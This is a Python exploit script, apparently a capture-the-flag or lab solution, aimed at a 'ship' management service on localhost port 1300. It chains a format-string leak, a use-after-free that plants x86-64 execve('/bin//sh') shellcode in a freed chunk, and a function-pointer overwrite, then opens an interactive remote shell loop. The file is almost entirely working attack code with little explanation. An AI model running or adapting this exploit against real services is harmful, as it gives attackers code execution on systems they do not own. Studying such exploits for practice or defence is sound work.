from __future__ import print_function
import socket
import time
import sys
import subprocess
from binascii import unhexlify
from binascii import hexlify

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 1300))

def convert_to_hex_endian(addr):
    addr_e = ""
    if len(addr) % 2 != 0:
        addr = "0" + addr
    for i in range(0, len(addr), 2):
        addr_e = (addr[i] + addr[i+1]) + addr_e
    
    return unhexlify(addr_e)

def send(msg):
    sock.sendall(msg + b"\n")
    time.sleep(0.1)
    received = sock.recv(1024)
    #print(received)
    return received

def parse_leaked_addr(reply):
    #print(reply)
    addr = reply.split("\n")[0]
    addr2 = addr.split("0x")[5]
    return addr2

print("Adding first ship.")
print("Performing format string attack on ship name field.")
send(b"1")
send(b"%p%p%p%p%p%p%p%p%p")
send(b"8")
send(b"2")
addr2 = parse_leaked_addr(send("0"))
print("Leaked address of the ship: 0x" + addr2)
print("Add 8 to it.")
addr2 = hex(int(addr2, 16))[2:]
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
call_addr = convert_to_hex_endian(addr2)
print("The leaked address is the one we want to call later: " + addr2)
print("Adding second ship")
send(b"1")
send(b"BBBB")
send(b"8")
print("Freeing the first ship.")
send(b"3")
send(b"0")
print("Performing use after free to write shellcode to first ship (now the banner).")
send(b"4")
send(shellcode)
print("Freeing the second ship.")
send(b"3")
send(b"1")
print("Performing use after free to overwrite function pointer to point to first ship.")
send(b"4")
send(b"A" * 24 + call_addr)
print("Triggering call to function pointer of second ship.")
send(b"2")
sock.sendall(b"1\n")
print("Dropping into psuedo shell. (Don't run commands that have no output.)")

try:
    while True:
        cmd = raw_input("$ ")
        print(send(bytes(cmd)))
except:
    sock.close()
